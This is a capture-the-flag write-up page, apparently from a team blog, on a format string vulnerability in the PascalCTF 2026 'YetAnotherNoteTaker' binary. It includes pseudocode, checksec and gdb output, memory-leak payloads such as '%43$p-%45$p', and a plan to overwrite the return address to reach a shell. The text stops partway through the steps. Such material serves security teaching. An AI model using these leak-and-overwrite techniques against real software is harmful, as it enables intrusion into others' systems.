@@ -1,0 +1,558 @@
+<!doctype html><head><link rel=stylesheet href=https://l1ncctf.github.io/css/main.min.cd04cd5d69efec14dc13e17d4c8876b1cd584327e8d67d88cc5d8bd6c3927c64.css></head><html lang=en><head><meta charset=utf-8><meta name=theme-color media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=viewport content="width=device-width,user-scalable=no,initial-scale=1,shrink-to-fit=no,viewport-fit=cover"><meta property="og:url" content="https://l1ncctf.github.io/post/pascalctf-pwn-yetanothernotetaker/"><meta property="og:site_name" content="L1NC CTF"><meta property="og:title" content="PascalCTF 2026 - YetAnotherNoteTaker"><meta property="og:description" content="This one is a classic challenge when you have to pop a shell or execute another OS command that allows to read the `flag` file."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2026-03-02T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-02T00:00:00+00:00"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="PascalCTF 2026 - YetAnotherNoteTaker"><meta name=twitter:description content="This one is a classic challenge when you have to pop a shell or execute another OS command that allows to read the `flag` file."><meta itemprop=name content="PascalCTF 2026 - YetAnotherNoteTaker"><meta itemprop=description content="This one is a classic challenge when you have to pop a shell or execute another OS command that allows to read the `flag` file."><meta itemprop=datePublished content="2026-03-02T00:00:00+00:00"><meta itemprop=dateModified content="2026-03-02T00:00:00+00:00"><meta itemprop=wordCount content="2254"><meta itemprop=keywords content="CTF"><title>PascalCTF 2026 - YetAnotherNoteTaker |
+L1NC CTF</title><link rel=apple-touch-icon sizes=180x180 href=/img/favicons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/img/favicons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/img/favicons/favicon-16x16.png><link rel="shortcut icon" href=/img/favicons/favicon.ico><meta name=apple-mobile-web-app-title content="L1NC CTF"><meta name=application-name content="L1NC CTF"><meta name=msapplication-TileColor content="#da532c"><meta name=msapplication-config content="/img/favicons/browserconfig.xml"><meta name=theme-color content="#ffffff"><link rel=preconnect href=https://fonts.googleapis.com><link rel=dns-prefetch href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=dns-prefetch href=https://fonts.gstatic.com><link rel=preconnect href=https://cdn.jsdelivr.net><link rel=dns-prefetch href=https://cdn.jsdelivr.net><link rel=stylesheet href=https://l1ncctf.github.io/css/main.min.cd04cd5d69efec14dc13e17d4c8876b1cd584327e8d67d88cc5d8bd6c3927c64.css><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&amp;family=Source+Sans+Pro:wght@400;600;700;900&amp;display=swap"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css><link rel=stylesheet href=/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css><script src=/js/modules/theme.js></script><script src=https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/js/glightbox.min.js></script><script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/dayjs.min.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/locale/en.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/plugin/relativeTime.js></script><script src=https://cdn.jsdelivr.net/npm/dayjs@1.11.13/plugin/localizedFormat.js></script><script defer src=/js/post.js></script></head><body><aside aria-label=Sidebar id=sidebar class="d-flex flex-column align-items-end"><header class=profile-wrapper><a href=/ id=avatar class=rounded-circle><img src=/img/commons/l1nc.png width=112 height=112 alt=avatar onerror='this.style.display="none"'></a>
+<a class="site-title d-block" href=/>L1NC CTF</a><p class="site-subtitle fst-italic mb-0">Be vigilant!</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class=nav><li class=nav-item><a href=/ class=nav-link><i class="fa-fw fas fa-house"></i>
+<span>HOME</span></a></li><li class=nav-item><a href=/categories/ class=nav-link><i class="fa-fw fas fa-stream"></i>
+<span>CATEGORIES</span></a></li><li class=nav-item><a href=/tags/ class=nav-link><i class="fa-fw fas fa-tags"></i>
+<span>TAGS</span></a></li><li class=nav-item><a href=/archives/ class=nav-link><i class="fa-fw fas fa-archive"></i>
+<span>ARCHIVES</span></a></li><li class=nav-item><a href=/about/ class=nav-link><i class="fa-fw fas fa-info-circle"></i>
+<span>ABOUT</span></a></li></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"><button type=button class="btn btn-link nav-link" aria-label="Switch Mode" id=mode-toggle>
+<i class="fas fa-adjust"></i>
+</button>
+<span class=icon-border></span>
+<a href=https://github.com/L1NCCTF aria-label=github target=_blank rel="noopener noreferrer"><i class="fab fa-github"></i>
+</a><a href=https://twitter.com/L1NC_CTF aria-label=twitter target=_blank rel="noopener noreferrer"><i class="fab fa-x-twitter"></i>
+</a><a href=https://l1ncctf.github.io/index.xml aria-label=rss><i class="fas fa-rss"></i></a></div></aside><div id=main-wrapper class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id=topbar-wrapper class=flex-shrink-0 aria-label="Top Bar"><div id=topbar class="d-flex align-items-center justify-content-between px-lg-3 h-100"><nav id=breadcrumb aria-label=Breadcrumb><span><a href=/>Home</a>
+</span><span>PascalCTF 2026 - YetAnotherNoteTaker</span></nav><button type=button id=sidebar-trigger class="btn btn-link" aria-label=Sidebar>
+<i class="fas fa-bars fa-fw"></i></button><div id=topbar-title>PascalCTF 2026 - YetAnotherNoteTaker</div><button type=button id=search-trigger class="btn btn-link" aria-label=Search>
+<i class="fas fa-search fa-fw"></i>
+</button>
+<search id=search class="align-items-center ms-3 ms-lg-0"><i class="fas fa-search fa-fw"></i>
+<input class=form-control id=search-input type=search aria-label=search autocomplete=off placeholder=Search...>
+</search><button type=button class="btn btn-link text-decoration-none" id=search-cancel>Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class=px-1 data-toc=false><header><h1 data-toc-skip>PascalCTF 2026 - YetAnotherNoteTaker</h1><p class="post-desc fw-light mb-4">This one is a classic challenge when you have to pop a shell or execute another OS command that allows to read the `flag` file.</p><div class="post-meta text-muted"><span>Posted
+<time data-ts=1772409600 data-df=ll data-bs-toggle=tooltip data-bs-placement=bottom>%b %e, %Y</time></span><div class="d-flex justify-content-between"><span>By
+<em><a href=https://nl.linkedin.com/in/stanislav-dashevskyi-69550860>pnevmoslon986</a></em></span><div><span class=readtime data-bs-toggle=tooltip data-bs-placement=bottom title="4983 words"><em>27 min</em> read</span></div></div></div></header><div class=content><h1 id=teh-vulnerability id=teh-vulnerability>Teh vulnerability</h1><p>This one is a classic challenge when you have to pop a shell or execute another
+OS command that allows to read the <code>flag</code> file. The pseudocode of the challenge
+is shown below:</p><div class=code-block><div class=code-header><span data-label-text=C><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mo>00</span><span class=o>:</span> <span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>01</span><span class=o>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=mo>02</span><span class=o>:</span>   <span class=kt>int</span> <span class=n>menu_item</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mo>03</span><span class=o>:</span>   <span class=kt>char</span> <span class=o>*</span><span class=n>menu_item_str</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mo>04</span><span class=o>:</span>   <span class=kt>char</span> <span class=n>note</span><span class=p>[</span><span class=mi>264</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=mo>05</span><span class=o>:</span>   <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>canary</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mo>06</span><span class=o>:</span>
+</span></span><span class=line><span class=cl><span class=mo>07</span><span class=o>:</span>   <span class=n>canary</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>08</span><span class=o>:</span>   <span class=nf>init</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>09</span><span class=o>:</span>   <span class=nf>memset</span><span class=p>(</span><span class=n>note</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>10</span><span class=o>:</span>   <span class=k>do</span>
+</span></span><span class=line><span class=cl><span class=mi>11</span><span class=o>:</span>   <span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=mi>12</span><span class=o>:</span>     <span class=nf>menu</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=mi>13</span><span class=o>:</span>     <span class=n>menu_item_str</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>14</span><span class=o>:</span>     <span class=nf>memset</span><span class=p>(</span><span class=n>menu_item_str</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x10u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>15</span><span class=o>:</span>     <span class=nf>fgets</span><span class=p>(</span><span class=n>menu_item_str</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>16</span><span class=o>:</span>     <span class=nf>sscanf</span><span class=p>(</span><span class=n>menu_item_str</span><span class=p>,</span> <span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>menu_item</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>17</span><span class=o>:</span>     <span class=nf>free</span><span class=p>(</span><span class=n>menu_item_str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>18</span><span class=o>:</span>     <span class=k>switch</span> <span class=p>(</span> <span class=n>menu_item</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>19</span><span class=o>:</span>     <span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=mi>20</span><span class=o>:</span>       <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
+</span></span><span class=line><span class=cl><span class=mi>21</span><span class=o>:</span>         <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Enter the note: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>22</span><span class=o>:</span>         <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>note</span><span class=p>,</span> <span class=mi>256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>23</span><span class=o>:</span>         <span class=n>note</span><span class=p>[</span><span class=nf>strcspn</span><span class=p>(</span><span class=n>note</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>24</span><span class=o>:</span>         <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>25</span><span class=o>:</span>       <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
+</span></span><span class=line><span class=cl><span class=mi>26</span><span class=o>:</span>         <span class=nf>memset</span><span class=p>(</span><span class=n>note</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>27</span><span class=o>:</span>         <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Note cleared.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>28</span><span class=o>:</span>         <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>29</span><span class=o>:</span>       <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
+</span></span><span class=line><span class=cl><span class=mi>30</span><span class=o>:</span>         <span class=nf>printf</span><span class=p>(</span><span class=n>note</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>31</span><span class=o>:</span>         <span class=nf>putchar</span><span class=p>(</span><span class=sc>&#39;\n&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>32</span><span class=o>:</span>         <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>33</span><span class=o>:</span>     <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=mi>34</span><span class=o>:</span>   <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=mi>35</span><span class=o>:</span>   <span class=k>while</span> <span class=p>(</span> <span class=n>menu_item</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>menu_item</span> <span class=o>&lt;=</span> <span class=mi>4</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=mi>36</span><span class=o>:</span>   <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=mi>37</span><span class=o>:</span> <span class=p>}</span></span></span></code></pre></td></tr></table></div></div></div><p>Note that we&rsquo;ve got a format string vulnerability[1] at the line 30, and that&rsquo;s
+the one we are going to take the advantage of.</p><h1 id=teh-exploitation-strategy id=teh-exploitation-strategy>Teh exploitation strategy</h1><p>With a format string vuln like this we can do pretty much everything: leak
+memory from the stack, or write to an arbitrary address. The question is what
+are we going to do with these great powers? Let&rsquo;s first see what binary
+protection mechanisms are enabled:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ checksec --file<span class=o>=</span>notetaker
+</span></span><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+</span></span><span class=line><span class=cl>Full RELRO      Canary found      NX enabled    No PIE          RW-RPATH   No RUNPATH   <span class=m>81</span> Symbols        No    <span class=m>0</span>               <span class=m>4</span>               notetaker</span></span></code></pre></td></tr></table></div></div></div><p>The important bits here are as follows:</p><pre><code>0. The binary is x64 (the addresses are 8 bytes long and such).
+1. `Full RELRO` - there's no writable `.plt.got` section so we can fuck off with that [2].
+2. `Canary found` - not that we care, but there are stack canaries enabled [3].
+3. `NX enabled` - the W^X mechanism is on (e.g., sections that are writable are
+   non-executable, and vice versa); this essentially means we can't place any
+   shellcode on the stack/heap or other interesting places [4]
+
+4. `No PIE` - typical, but still good - this one means you know the virtual
+   addresses within the sections such as .text, .bss and others at runtime (same
+   as in the binary) [3]
+
+5. It is also very typical to expect that `ASLR`[5] is enabled (and it often
+   is), which means you can't know the base address of the stack, heap, and
+   library loads at runtime.
+</code></pre><p>Typically, what we want to achieve is redirecting the control flow of the
+program to the <code>system("/bin/sh")</code> function that will give us the shell. With
+format string vulnerabilities we can write anywhere we want so we can just
+overwrite the return address of the <code>main()</code> function to point to <code>system()</code> and
+that&rsquo;s it. However, there are the following problems:</p><pre><code>1. We don't know the address of the `system` function (hello `ASLR`).
+2. And even if we knew it, we can't pass arguments into `system()`.
+</code></pre><p>To summarize, we can write to an arbitrary address on the heap, stack, and other
+writable sections, we just don&rsquo;t know where and what. No matter, our friend
+format string got us covered. Also, say hello to your new friends:
+Return-to-libc [6], and Return-oriented programming [7].</p><p>The format strings like <code>%N$p</code> allows to print addresses right from the stack,
+where <code>N</code> is the number of the positional argument to <code>printf()</code> (remember that
+this function takes a variable number of arguments, and they are supposed to be
+on the stack, so if there are no guardrails around the format string, we can
+read the stack as far as we want).</p><p>First, we need to understand where the return address is located on the stack
+(we break somewhere in <code>main()</code> and check like so):</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> x/gx <span class=nv>$rbp</span>+0x8
+</span></span><span class=line><span class=cl>0x7ffef2f087d8: 0x000078de48620840</span></span></code></pre></td></tr></table></div></div></div><p>Here, <code>0x78de48620840</code> is the return address (after <code>main()</code> exits, the control
+flow will be redirected there), and <code>0x7ffef2f087d8</code> is the address on the stack
+at which this return address is located.</p><p>Now, we need to leak this somehow. To choose the right number for the stack
+memory (<code>N</code>) location(s) we want to leak, we break right before we are about to
+call printf (line 30 in the pseudocode) and print the contents of the stack like
+so:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>                <span class=o>(</span>gdb<span class=o>)</span> x/64gx <span class=nv>$rsp</span>
+</span></span><span class=line><span class=cl>6th arg ---&gt;    0x7ffef2f086b0: 0x0000000148d1d700      0x0000000001820010
+</span></span><span class=line><span class=cl>                0x7ffef2f086c0: 0x0000007024333425      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f086d0: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f086e0: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f086f0: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08700: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08710: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08720: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08730: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08740: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08750: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08760: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08770: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08780: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f08790: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f087a0: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f087b0: 0x0000000000000000      0x0000000000000000
+</span></span><span class=line><span class=cl>                0x7ffef2f087c0: 0x00007ffef2f088b0      0x7a03943a2e897900 &lt;--- 41th arg <span class=o>(</span>the stack canary<span class=o>)</span>
+</span></span><span class=line><span class=cl>                0x7ffef2f087d0: 0x0000000000400ba0      0x000078de48620840 &lt;--- 43rd arg <span class=o>(</span>the <span class=k>return</span> address<span class=o>)</span>
+</span></span><span class=line><span class=cl>                0x7ffef2f087e0: 0x0000000000000001      0x00007ffef2f088b8 &lt;--- 45th arg <span class=o>(</span>the 2nd argument of the main<span class=o>()</span> func<span class=o>)</span>
+</span></span><span class=line><span class=cl>                <span class=o>[</span>...<span class=o>]</span></span></span></code></pre></td></tr></table></div></div></div><p>Unlike <code>x86</code>, where all the <code>printf()</code> arguments are stored on the stack, on
+<code>x64</code> these are pushed into the stack only starting from the sixth argument.</p><p>Eventually, we can see that the 43rd argument is an address in <code>libc</code>, and the
+45th argument is an address on the stack. To confirm, we can check see the base
+of the stack and libc in gdb:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> info proc mappings
+</span></span><span class=line><span class=cl>process <span class=m>9081</span>
+</span></span><span class=line><span class=cl>Mapped address spaces:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            Start Addr           End Addr       Size     Offset  Perms  objfile
+</span></span><span class=line><span class=cl>                   0x400000           0x401000     0x1000        0x0  r-xp   /yetAnotherNoteTaker/notetaker
+</span></span><span class=line><span class=cl>                   0x601000           0x602000     0x1000     0x1000  r--p   /yetAnotherNoteTaker/notetaker
+</span></span><span class=line><span class=cl>                   0x602000           0x603000     0x1000     0x2000  rw-p   /yetAnotherNoteTaker/notetaker
+</span></span><span class=line><span class=cl>                   0x1820000          0x1841000    0x21000       0x0  rw-p   <span class=o>[</span>heap<span class=o>]</span>
+</span></span><span class=line><span class=cl>               <span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>libc base ---&gt; 0x78de48600000     0x78de487c0000   0x1c0000      0x0  r-xp   /yetAnotherNoteTaker/libs/libc.so.6
+</span></span><span class=line><span class=cl>               <span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>stack base ---&gt; 0x7ffef2ee9000     0x7ffef2f0a000    0x21000     0x0  rw-p   <span class=o>[</span>stack<span class=o>]</span>
+</span></span><span class=line><span class=cl>               <span class=o>[</span>...<span class=o>]</span></span></span></code></pre></td></tr></table></div></div></div><p>Now, to leak these two addresses all we need to do is to craft the following
+input:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>1. Read note
+</span></span><span class=line><span class=cl>2. Write note
+</span></span><span class=line><span class=cl>3. Clear note
+</span></span><span class=line><span class=cl>4. Exit
+</span></span><span class=line><span class=cl>&gt; <span class=m>2</span>
+</span></span><span class=line><span class=cl>Enter the note: %43<span class=nv>$p</span>-%45<span class=nv>$p</span>
+</span></span><span class=line><span class=cl>1. Read note
+</span></span><span class=line><span class=cl>2. Write note
+</span></span><span class=line><span class=cl>3. Clear note
+</span></span><span class=line><span class=cl>4. Exit
+</span></span><span class=line><span class=cl>&gt; <span class=m>1</span>
+</span></span><span class=line><span class=cl>0x78de48620840-0x7ffef2f088b8
+</span></span><span class=line><span class=cl>1. Read note
+</span></span><span class=line><span class=cl>2. Write note
+</span></span><span class=line><span class=cl>3. Clear note
+</span></span><span class=line><span class=cl>4. Exit</span></span></code></pre></td></tr></table></div></div></div><p>As I already mentioned, you can do arbitrary writes with format string bugs. I
+am not going to explain it here, but there are great resources out there [1]. If
+you are using <code>pwntools</code>, you can take advantage of the
+<code>pwnlib.fmtstr.fmtstr_payload()</code>[9] function to make your life much easier. All
+you need to know is the offset, the address you are about to overwrite and the
+address you want to be written. To figure out the offset you should do something
+like this:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; <span class=m>2</span>
+</span></span><span class=line><span class=cl>Enter the note: AAAAAAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
+</span></span><span class=line><span class=cl>1. Read note
+</span></span><span class=line><span class=cl>2. Write note
+</span></span><span class=line><span class=cl>3. Clear note
+</span></span><span class=line><span class=cl>4. Exit
+</span></span><span class=line><span class=cl>&gt; <span class=m>1</span>
+</span></span><span class=line><span class=cl>AAAAAAAA0x78de489c4b28-<span class=o>(</span>nil<span class=o>)</span>-<span class=o>(</span>nil<span class=o>)</span>-0x1820010-<span class=o>(</span>nil<span class=o>)</span>-0x148d1d700-0x1820010-0x4141414141414141-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7025-<span class=o>(</span>nil<span class=o>)</span>-<span class=o>(</span>nil<span class=o>)</span></span></span></code></pre></td></tr></table></div></div></div><p>You see, that out input (<code>0x4141414141414141</code>) appears at the 8th position, so
+the offset will be <code>8</code>.</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>gdb<span class=o>)</span> x/gx <span class=nv>$rbp</span>+0x8
+</span></span><span class=line><span class=cl>0x7ffef2f087d8: 0x000078de48620840</span></span></code></pre></td></tr></table></div></div></div><p>Keep in mind that we want to overwrite the return address <code>0x78de48620840</code>
+with the address of <code>system()</code>. To do that we need to calculate a few things:</p><ol><li><p>The address on the stack where the return address is stored. Since the stack
+layout is deterministic in a way (the base address changes between runs due
+to <code>ASLR</code>, but offsets stay the same), by leaking one stack address at a
+specific location we can reconstruct the rest. In this case, we leak the 2nd
